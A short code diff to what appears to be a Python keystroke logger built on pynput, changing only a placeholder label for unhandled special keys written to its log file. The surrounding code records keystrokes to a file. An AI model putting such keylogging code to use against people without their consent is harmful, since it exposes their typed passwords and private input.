@@ -13,7 +13,7 @@ def keyPressed(key):
             elif key == keyboard.Key.backspace:
                 logKey.write("<Backspace>")
             else:
-                logKey.write("<Unhandled_Special_Key>")
+                logKey.write("<Unhandled Special Key>")
 
 def on_release(key):
     # Stop the listener on pressing 'F10'
